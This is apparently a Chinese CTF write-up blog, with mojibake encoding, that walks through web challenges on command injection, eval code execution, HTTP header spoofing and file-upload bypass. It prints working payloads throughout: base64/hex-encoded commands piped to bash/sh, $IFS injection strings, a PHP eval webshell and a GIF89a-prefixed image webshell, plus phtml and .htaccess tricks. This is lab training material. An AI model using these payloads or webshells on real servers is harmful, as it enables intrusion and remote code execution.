å­—ç¬¦â€˜|â€™ç›¸å½“äº<span class="hljs-type">OR</span> æ“ä½œï¼š<span class="hljs-comment">&quot;(bâ”‚cd)ef&quot;</span>: åŒ¹é…å«æœ‰ <span class="hljs-comment">&quot;bef&quot;</span> æˆ–è€… <span class="hljs-comment">&quot;cdef&quot;</span>çš„å­—ç¬¦ä¸²;

ä¸­æ‹¬å·[xxx]æ‹¬ä½çš„å†…å®¹åªåŒ¹é…ä¸€ä¸ªå•ä¸€çš„å­—ç¬¦:<span class="hljs-comment">&quot;^[a-zA-Z]&quot;</span>: åŒ¹é…ä»¥å­—æ¯å¼€å¤´çš„å­—ç¬¦ä¸²;<span class="hljs-comment">&quot;[a-d]&quot;</span>: åŒ¹é…<span class="hljs-string">&#x27;a&#x27;</span> åˆ°<span class="hljs-string">&#x27;d&#x27;</span>çš„å•ä¸ªå­—ç¬¦ (å’Œ<span class="hljs-comment">&quot;aâ”‚bâ”‚câ”‚d&quot;</span> è¿˜æœ‰ <span class="hljs-comment">&quot;[abcd]&quot;</span>æ•ˆæœä¸€æ ·);
</code></pre>
<ol start="4" type="1">
<li>==flagè¢«è¿‡æ»¤ï¼Œç»•è¿‡æ–¹æ³•ï¼š==</li>
</ol>
<pre><code class="hljs haml">æ‹¼æ¥ç»•è¿‡:a=l;b=s;$a$b
ç¼–ç ç»•è¿‡ï¼š
base64ï¼š
echo â€œY2F0IC9mbGFnâ€|base64-d|bash
=<span class="ruby">=&gt;cat /flag</span>
<span class="ruby">hexï¼š</span>
<span class="ruby">echo â€œ<span class="hljs-number">636174202</span>f666c6167â€ <span class="hljs-params">| xxd -r -p|</span>bash</span>
<span class="ruby">==&gt;cat /flag</span>
<span class="ruby">octï¼š</span>
<span class="ruby">$(printf â€œ\<span class="hljs-number">154</span>\<span class="hljs-number">163</span>â€)</span>
<span class="ruby">==&gt;ls</span></code></pre>
<p>payload1ï¼šå˜é‡æ‹¼æ¥ï¼š</p>
<p>åœ¨flagè´ªå©ªåŒ¹é…é‡Œé¢æˆ‘ä»¬ä¸å°†flagè¿ç€å†™ï¼Œå°±ä¸ä¼šåŒ¹é…åˆ°ï¼ŒåŒæ—¶å¯ä»¥çœ‹åˆ°æœ‰$aå˜é‡ï¼Œå°è¯•è¦†ç›–å®ƒ</p>
<pre><code class="hljs powershell">?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;b=lag;a=f;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$a</span><span class="hljs-variable">$b</span>.php
?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;b=g;<span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9fla</span><span class="hljs-variable">$b</span>.php</code></pre>
<p>payload2ï¼šè¿‡æ»¤bashï¼Œå°±ç”¨shï¼Œshçš„å¤§éƒ¨åˆ†è„šæœ¬éƒ½å¯ä»¥åœ¨bashä¸‹è¿è¡Œã€‚</p>
<pre><code class="hljs stata">bashï¼š
echo <span class="hljs-string">&quot;Y2F0IGZsYWcucGhw&quot;</span>| base64 -<span class="hljs-keyword">d</span> | bash  <span class="hljs-comment">//å‘ç°è¢«è¿‡æ»¤</span>
<span class="hljs-keyword">sh</span>ï¼š
echo<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>-<span class="hljs-keyword">d</span>|<span class="hljs-keyword">sh</span>  <span class="hljs-comment">//æˆåŠŸ</span>
Y2F0IGZsYWcucGhwï¼š<span class="hljs-keyword">cat</span> flag.php</code></pre>
<h4 id="å¥‡æ·«æŠ€å·§å†…è”æ‰§è¡Œ">â€œå¥‡æ·«æŠ€å·§â€ï¼šå†…è”æ‰§è¡Œ</h4>
<p>å†…è”ï¼Œå°±æ˜¯å°†åå¼•å·å†…å‘½ä»¤çš„è¾“å‡ºä½œä¸ºè¾“å…¥æ‰§è¡Œã€‚</p>
<p>ç§’é¢˜å¤§æ¦‚å°±æ˜¯è¿™ç§åšæ³•å§......</p>
<p>==<strong>payload3ï¼šå†…è”ç»•è¿‡ï¼Œæ— éœ€åˆ—å‡ºä¸­é—´ç»“æœï¼Œå¯ä»¥ä¸€æ¬¡è¾“å‡ºå¤šä¸ªæ–‡ä»¶å†…å®¹</strong>==</p>
<pre><code class="hljs stata">?ip=;<span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span>`<span class="hljs-keyword">ls</span>`</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130123618657.png" srcset="/img/loading.gif" alt="image-20220130123618657" style="zoom:67%;"></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019knife">[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h2>
<h3 id="è€ƒç‚¹evalä»£ç æ‰§è¡Œ">è€ƒç‚¹ï¼ševalä»£ç æ‰§è¡Œ</h3>
<p>eval($_POST["Syc"]);</p>
<p><strong>è¿ç”¨eval()è¦æ³¨æ„å‡ ç‚¹:</strong></p>
<ul>
<li>evalå‡½æ•°çš„==å‚æ•°çš„å­—ç¬¦ä¸²æœ«å°¾ä¸€å®šè¦æœ‰åˆ†å·==</li>
<li><strong>eval()</strong> è¿”å›
<strong><code>NULL</code></strong>ï¼Œä¸å›æ˜¾ï¼Œå¾—æœ‰echoæ‰å›æ˜¾</li>
</ul>
<p>payload</p>
<pre><code class="hljs ini"><span class="hljs-attr">Syc</span>=echo  `ls`<span class="hljs-comment">;   //çœ‹æºç ï¼Œå‘ç°åªæœ‰index.php</span>
<span class="hljs-attr">Syc</span>=echo  `ls /`<span class="hljs-comment">;  //çœ‹æ ¹ç›®å½•ï¼Œå‘ç°flagæ–‡ä»¶</span>
<span class="hljs-attr">Syc</span>=echo  `cat /flag`<span class="hljs-comment">; //å¾—åˆ°flag</span></code></pre>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019http">[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2>
<h3 id="è€ƒhttpå¤§æ¦‚ç‡è€ƒhttpè¯·æ±‚ä½“headerçš„ç”¨æ³•">è€ƒhttpï¼Œå¤§æ¦‚ç‡è€ƒhttpè¯·æ±‚ä½“headerçš„ç”¨æ³•</h3>
<p>å¯ä»¥ç”¨burpsuite/æµè§ˆå™¨hackbarç›´æ¥åŠ </p>
<ol type="1">
<li>è®¿é—®ç½‘ç«™ï¼ŒæŸ¥çœ‹æºç å‘ç°è·³è½¬æ–‡ä»¶secret.php</li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130133859973.png" srcset="/img/loading.gif" alt="image-20220130133859973"></p>
<ol start="2" type="1">
<li><p>ç½‘é¡µæ˜¾ç¤ºIt doesn't come from
'https://Sycsecret.buuoj.cn'æç¤ºä¸æ˜¯ä»æŸç½‘ç«™è·³è½¬è¿‡æ¥çš„==ã€‹ä¿®æ”¹Referer:https://www.Sycsecret.com</p></li>
<li><p>Please use "Syclover" browser
==ã€‹ä¿®æ”¹User-Agent:Syclover</p></li>
<li><p>No!!! you can only read this locally!!!
==ã€‹è¦ä»æœ¬åœ°è®¿é—®==ã€‹ä¿®æ”¹X-Forwarded-For:127.0.0.1</p></li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220130134240237.png" srcset="/img/loading.gif" alt="image-20220130134240237"></p>
<h2 id="æå®¢å¤§æŒ‘æˆ˜-2019upload">[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2>
<h3 id="è€ƒç‚¹å›¾ç‰‡å¤´ç»•è¿‡phpå¯è§£æåç¼€ä¸Šä¼ ä½ç½®">è€ƒç‚¹ï¼š&lt;?ã€å›¾ç‰‡å¤´ç»•è¿‡ã€phpå¯è§£æåç¼€ã€ä¸Šä¼ ä½ç½®</h3>
<p>æŸ¥çœ‹æºç ï¼Œå…³é”®æºç </p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;upload_file.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span>
   	<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;center&quot;</span>&gt;</span>  
   		<span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font:20px Georgia,serif;&quot;</span>&gt;</span>å›¾ç‰‡ï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
   		<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span> &gt;</span>
  			<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;æäº¤&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;button&quot;</span>&gt;</span>
  		<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></code></pre>
<h4 id="htmlçŸ¥è¯†">htmlçŸ¥è¯†</h4>
<p><strong><em>divæ ‡ç­¾å®šä¹‰ HTML
æ–‡æ¡£ä¸­çš„åˆ†éš”ï¼ˆDIVisionï¼‰æˆ–éƒ¨åˆ†ï¼ˆsectionï¼‰ï¼Œè¡¨ç¤ºä¸€å—</em></strong></p>
<p><strong><em>alignæ˜¯å¯¹é½å±æ€§ï¼Œcenterï¼šå±…ä¸­å¯¹é½</em></strong></p>
<p><strong><em>action
å±æ€§è§„å®šå½“æäº¤è¡¨å•æ—¶ï¼Œå‘ä½•å¤„å‘é€è¡¨å•æ•°æ®ã€‚</em></strong></p>
<p>ä¸Šä¼ æ–‡ä»¶åˆ°upload_file.phpï¼Œæ–‡ä»¶è¡¨å•åå«file</p>
<ol type="1">
<li>è¯•è¯•ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬shell.phpï¼Œå‘ç°ä¸è¡Œï¼Œè¿”å›Not
image!ï¼Œå‰ç«¯å¯¹åç¼€åæœ‰é™åˆ¶</li>
</ol>
<pre><code class="hljs php">Content-Type: application/octet-stream
<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>($_POST[<span class="hljs-string">&#x27;shell&#x27;</span>]);<span class="hljs-meta">?&gt;</span></code></pre>
<ol start="2" type="1">
<li><p>æ”¹æˆshell.php.jpgä¹Ÿä¸è¡Œï¼Œæ”¹mime:image/jpegä¹Ÿä¸è¡Œï¼Œè¯´æ˜åç«¯å¯¹æ–‡ä»¶å¤´æœ‰é™åˆ¶</p></li>
<li><p>ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œå‘ç°å¯¹<?æœ‰è¿‡æ»¤

- **==æ ‡ç­¾ç»•è¿‡==**ï¼š`<script language=php>
eval($_POST['c']);`</p>
<ul>
<li>``<code>æ ‡å‡†æ ‡ç­¾ï¼š&lt;?php   ç®€å†™æ ‡ç­¾  &lt;?=    å®ƒæ˜¯ &lt;?php echo çš„ç®€å†™å½¢å¼,ï¼ˆæ— éœ€é—­åˆå°¾å·´ï¼‰   çŸ­æ ‡è®°(&lt;? xxx ?&gt;)ï¼Œéœ€å¼€å¯([short_open_tag](https://www.php.net/manual/zh/ini.core.php#ini.short-open-tag)in php.ini)   aspæ ‡ç­¾(&lt;%xxx%&gt;)ã€ç¦ç”¨äº†&lt;?ã€ &lt;?phpã€ ?&gt;æ—¶ã€‘éœ€å¼€å¯ï¼ˆasp_tagsï¼‰   &lt;script language=php&gt;echo  â€˜123â€™;&lt;/script&gt; è¿™é‡Œä¸å­˜åœ¨&lt;?ï¼Œå¯ä»¥ç»•è¿‡æ­£åˆ™å¯¹&lt;? ,&lt;?phpï¼Œaspçš„é™åˆ¶   æ³¨æ„âš ï¸php&gt;7åºŸé™¤äº†aspæ ‡ç­¾å’Œscriptæ ‡ç­¾   <pre><code class="hljs xml">
4. æˆåŠŸä¸Šä¼ shell.jpgï¼Œä½†æ€ä¹ˆè®©ä»–è§£æå‘¢?æ­¤æ³•ä¸è¡Œï¼Œåé¢ä¸Šä¼ .htaccessä¹Ÿä¸è¡Œï¼Œå¿…é¡»å†…å®¹æ˜¯å›¾ç‰‡å¼€å¤´ï¼Œè¯´æ˜è¿˜æ˜¯åç¼€è§£æé—®é¢˜
5. <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;background:#bbffff;&quot;</span>&gt;</span>**é»˜è®¤åç¼€phpè§£æ**<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
</code></pre> âš é»˜è®¤åç¼€è§£æ  phtmlã€phtã€php3ã€php4å’Œphp5éƒ½æ˜¯Apacheå’Œphpè®¤å¯çš„phpç¨‹åºçš„æ–‡ä»¶åç¼€ php2, php3, php4, php5, phps, pht, phtm, phtml <pre><code class="hljs routeros">
ä¿®æ”¹åç¼€php2ï¼Œphp3.ã€‚éƒ½ä¸è¡Œ

**ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹ä¸ºphtmlï¼Œåªæœ‰è¿™æ ·æ‰èƒ½ä½¿ç½‘é¡µåç«¯æ‰§è¡Œæˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬**

&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213230412016.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213230412016&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom:67%;&quot;</span> /&gt;



ç²¾ç®€ç‰ˆï¼š

**è¿™é¢˜çš„ç»•è¿‡ç‚¹æœ‰ä¸‰ä¸ªï¼Œä¸€ä¸ªå°±æ˜¯æ–‡ä»¶å†…å®¹ä¸èƒ½æœ‰&lt;?ï¼Œè¿˜æœ‰å°±æ˜¯æ–‡ä»¶åç¼€çš„ç»•è¿‡ï¼Œè¿˜æœ‰å›¾ç‰‡å¤´ã€‚**
</code></pre> GIF89a? &lt;script language="php"&gt;eval($_POST[c])&lt;/script&gt; <pre><code class="hljs routeros">
è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯**ä¸Šä¼ ä¹‹åçš„æ–‡ä»¶åœ¨å“ª**ã€‚**&lt;span <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;background:#FF9999;&quot;</span>&gt;çŒœæµ‹è¿˜æ˜¯å¸¸è§„çš„ç›®å½•/uploadä¸‹é¢&lt;/span&gt;**

&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213230719900.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213230719900&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom:50%;&quot;</span> /&gt;

è®¿é—®11.phtmlå¤±è´¥ï¼Œè¯´æ˜ä½ç½®ä¸å¯¹ï¼ŒGETè®¿é—®upload/11.phtmlæˆåŠŸï¼Œæ˜¾ç¤ºå›¾ç‰‡æºç 

&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213224630667.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213224630667&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom: 50%;&quot;</span> /&gt;

POSTè®¿é—®ï¼ŒæˆåŠŸ

&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220213224720182.png&quot;</span> <span class="hljs-attribute">alt</span>=<span class="hljs-string">&quot;image-20220213224720182&quot;</span> <span class="hljs-attribute">style</span>=<span class="hljs-string">&quot;zoom: 50%;&quot;</span> /&gt;

payloadï¼šPOSTï¼šupload/11.phtmlï¼ŒPOSTï¼š
</code></pre> c=echo</code>cat
/flag`; <pre><code class="hljs">




## [ACTF2020 æ–°ç”Ÿèµ›]Upload

### è€ƒç‚¹ï¼šphpå¸¸è§åç¼€è§£æç»•è¿‡

&gt; [å‚è€ƒWP](https://www.cnblogs.com/yesec/p/12403922.html)

æŸ¥çœ‹æºç 

```html
 &lt;div class=&quot;light&quot;&gt;&lt;span class=&quot;glow&quot;&gt;
			&lt;form enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; onsubmit=&quot;return checkFile()&quot;&gt;
				å˜¿ä¼™è®¡ï¼Œä½ å‘ç°å®ƒäº†ï¼
                &lt;input class=&quot;input_file&quot; type=&quot;file&quot; name=&quot;upload_file&quot;/&gt;
                &lt;input class=&quot;button&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;upload&quot;/&gt;
            &lt;/form&gt;
      &lt;/span&gt;&lt;span class=&quot;flare&quot;&gt;&lt;/span&gt;&lt;div&gt;</code></pre></li>
</ul></li>
</ol>
<p><strong><em><a target="_blank" rel="noopener" href="https://blog.csdn.net/YoungStar70/article/details/64934435">onsubmit</a>è¡¨ç¤ºè¡¨å•æäº¤æ—¶éªŒè¯çš„äº‹ä»¶,å®ƒæ˜¯åœ¨è¡¨å•ä¸­çš„ç¡®è®¤æŒ‰é’®è¢«ç‚¹å‡»æ—¶å‡ºå‘çš„ï¼Œä¸€èˆ¬æ˜¯jså‡½æ•°ï¼Œå‡½æ•°è¿”å›å…¶ä»–å€¼/ä¸è¿”å›è¡¨å•å†…å®¹æ‰èƒ½æäº¤ï¼Œå‡½æ•°è¿”å›falseè¡¨å•ä¸ä¼šæäº¤</em></strong>ï¼ˆ<a target="_blank" rel="noopener" href="https://zhidao.baidu.com/question/111968742.html">ç™¾åº¦çŸ¥é“</a>ï¼‰</p>
<p>å‰ç«¯å¯¹æ–‡ä»¶åç¼€æœ‰é™åˆ¶ï¼Œå®¡æŸ¥å…ƒç´ åˆ æ‰ä¹Ÿä¸è¡Œ</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214154853790.png" srcset="/img/loading.gif" alt="image-20220214154853790" style="zoom: 50%;"></p>
<p>ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œå‘ç°å¯¹ä¸Šä¼ åçš„æ–‡ä»¶é‡å‘½åäº†</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214155009513.png" srcset="/img/loading.gif" alt="image-20220214155009513" style="zoom: 67%;"></p>
<p>ç›´æ¥è®¿é—®ï¼Œå‘ç°æ˜¯å›¾ç‰‡</p>
<p>ä¿®æ”¹åç¼€åä¸º11.phtmlï¼Œä¸Šä¼ æˆåŠŸï¼Œè®¿é—®ç½‘é¡µæˆåŠŸè§£æphp</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214163807480.png" srcset="/img/loading.gif" alt="image-20220214163807480" style="zoom:67%;"></p>
<p>POSTè®¿é—®uplo4d/87226c8336e7d8806fd8d3324fbcda6b.phtml</p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">c</span>=echo <span class="hljs-string">`cat  /flag`</span>;</code></pre>
<p>å¾—åˆ°flag</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214163848001.png" srcset="/img/loading.gif" alt="image-20220214163848001" style="zoom: 50%;"></p>
<p>èšå‰‘è¿æ¥åæŸ¥çœ‹æºç ï¼š</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    error_reporting(<span class="hljs-number">0</span>);
    <span class="hljs-comment">//è®¾ç½®ä¸Šä¼ ç›®å½•</span>
    define(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>, <span class="hljs-string">&quot;./uplo4d&quot;</span>);
    $msg = <span class="hljs-string">&quot;Upload Success!&quot;</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;
        $temp_file = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
        $file_name = $_FILES[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];
        $ext = pathinfo($file_name,PATHINFO_EXTENSION);  <span class="hljs-comment">//è§„å®šæ–°çš„æ–‡ä»¶åç¼€åä¸ºæºæ–‡ä»¶åç¼€å</span>
        <span class="hljs-keyword">if</span>(in_array($ext, [<span class="hljs-string">&#x27;php&#x27;</span>, <span class="hljs-string">&#x27;php3&#x27;</span>, <span class="hljs-string">&#x27;php4&#x27;</span>, <span class="hljs-string">&#x27;php5&#x27;</span>])) &#123;   <span class="hljs-comment">//è¿™é‡Œä¸å‡ºæ‰€æ–™,è¿‡æ»¤äº†å¸¸è§çš„phpæ–‡ä»¶æ‹“å±•å</span>
            <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;nonono~ Bad fileï¼&#x27;</span>);
        &#125;

        $new_file_name = md5($file_name).<span class="hljs-string">&quot;.&quot;</span>.$ext;    <span class="hljs-comment">//æ–°çš„æ–‡ä»¶åä¸ºmd5å€¼åŠ ä¸Šåç¼€å</span>
        $img_path = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . $new_file_name;


        <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path))&#123;
            $is_upload = <span class="hljs-literal">true</span>;
        &#125; <span class="hljs-keyword">else</span> &#123;
            $msg = <span class="hljs-string">&#x27;Upload Failed!&#x27;</span>;
        &#125;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.$msg.<span class="hljs-string">&quot; Look here~ &quot;</span>.$img_path.<span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>;
    &#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<blockquote>
<p><strong><em><a target="_blank" rel="noopener" href="https://www.runoob.com/php/func-filesystem-pathinfo.html">pathinfo()</a>
å‡½æ•°ä»¥æ•°ç»„çš„å½¢å¼è¿”å›å…³äºæ–‡ä»¶è·¯å¾„çš„ä¿¡æ¯ã€‚</em></strong></p>
<p>è¯­æ³•ï¼špathinfo(path,options)ï¼Œopyionsé‡Œçš„PATHINFO_EXTENSION - åªè¿”å›
extension</p>
</blockquote>
<p>ä»æºç ä¸­å¯ä»¥çœ‹å‡ºåªå¯¹ä¸Šä¼ åçš„æ–‡ä»¶æ›´åå¹¶ç§»åˆ°uploadç›®å½•ä¸‹ï¼Œå¹¶æ²¡æœ‰åˆ é™¤</p>
<h4 id="æ€»ç»“ä¸€ä¸‹ctfæ–‡ä»¶ä¸Šä¼ é¢˜ä¸­å¸¸è§è€ƒç‚¹">æ€»ç»“ä¸€ä¸‹CTFæ–‡ä»¶ä¸Šä¼ é¢˜ä¸­å¸¸è§è€ƒç‚¹</h4>
<ul>
<li>åˆ©ç”¨ä¸­é—´ä»¶è§£ææ¼æ´ç»•è¿‡æ£€æŸ¥ï¼Œå®æˆ˜å¸¸ç”¨</li>
<li>ä¸Šä¼ .user.iniæˆ–.htaccesså°†åˆæ³•æ‹“å±•åæ–‡ä»¶å½“ä½œphpæ–‡ä»¶è§£æ</li>
<li>%00æˆªæ–­ç»•è¿‡</li>
<li>php3åç¼€è§£æ</li>
<li>php4æ–‡ä»¶</li>
<li>php5æ–‡ä»¶</li>
<li>php7æ–‡ä»¶</li>
<li>phtmlæ–‡ä»¶</li>
<li>phpsæ–‡ä»¶</li>
<li>phtæ–‡ä»¶</li>
</ul>
<h2 id="mrctf2020ä½ ä¼ ä½ å‘¢">[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2>
<h3 id="è€ƒç‚¹.htaccessmimeåç¼€">è€ƒç‚¹ï¼š.htaccessã€mime+åç¼€</h3>
<p>ä¸Šä¼ ä¸€å¥è¯ï¼Œå›¾ç‰‡é©¬éƒ½ä¸è¡Œï¼Œåç«¯éªŒè¯</p>
<p>é‚£å°±ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œ<strong>==ä¿®æ”¹mimeä¸º
image/jpeg==</strong>ï¼Œå‘ç°æˆåŠŸä¸Šä¼ ï¼Œè¿™æ ·å°±å¯ä»¥è®© <strong>jpg</strong>
è§£æä¸º <strong>php</strong></p>
<blockquote>
<p><strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html">htaccess</a>æ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£æ‰€åœ¨ç›®å½•ä¸‹çš„ç½‘é¡µè§£æé…ç½®</strong></p>
<p><strong>.htaccessæ–‡ä»¶ä¸­çš„é…ç½®æŒ‡ä»¤ä½œç”¨äº.htaccessæ–‡ä»¶æ‰€åœ¨çš„ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ï¼Œä¸”å­ç›®å½•ä¸­çš„æŒ‡ä»¤ä¼šè¦†ç›–çˆ¶ç›®å½•æˆ–è€…ä¸»é…ç½®æ–‡ä»¶ä¸­çš„æŒ‡ä»¤</strong></p>
</blockquote>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214174709873.png" srcset="/img/loading.gif" alt="image-20220214174709873" style="zoom:67%;"></p>
<p>ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬phpæ–‡ä»¶</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175230427.png" srcset="/img/loading.gif" alt="image-20220214175230427" style="zoom: 80%;"></p>
<p>ä¿®æ”¹åç¼€ã€mimeï¼ŒæˆåŠŸä¸Šä¼ </p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175305517.png" srcset="/img/loading.gif" alt="image-20220214175305517" style="zoom:67%;"></p>
<p>æˆåŠŸè®¿é—®</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175337259.png" srcset="/img/loading.gif" alt="image-20220214175337259" style="zoom: 50%;"></p>
<p>èšå‰‘è¿æ¥å¾—åˆ°flagï¼Œä¸çŸ¥é“ä¸ºå•¥ç›´æ¥hackbar shell=echo `cat /flag`
ä¸è¡Œ</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220214175930523.png" srcset="/img/loading.gif" alt="image-20220214175930523" style="zoom:67%;"></p>
<p>æºç åˆ†æï¼Œå¯¹åç¼€æœ‰é™åˆ¶ï¼šå«phå°±ä¸è¡Œï¼Œå¯¹æ–‡ä»¶ç±»å‹å³mimeæœ‰é™åˆ¶ï¼Œå¾—æ˜¯imageç±»ï¼Œå¯¹å¤§å°ä¹Ÿæœ‰é™åˆ¶ï¼Œç„¶åå°±ç›´æ¥è¾“å‡ºæ–‡ä»¶å†…å®¹ï¼ŒæŠŠä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ç›®å½•ä¸‹</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
session_start();
<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot;</span>;
<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>]))&#123;
    $_SESSION[<span class="hljs-string">&#x27;user&#x27;</span>] = md5((<span class="hljs-keyword">string</span>)time() . (<span class="hljs-keyword">string</span>)rand(<span class="hljs-number">100</span>, <span class="hljs-number">1000</span>));
&#125;
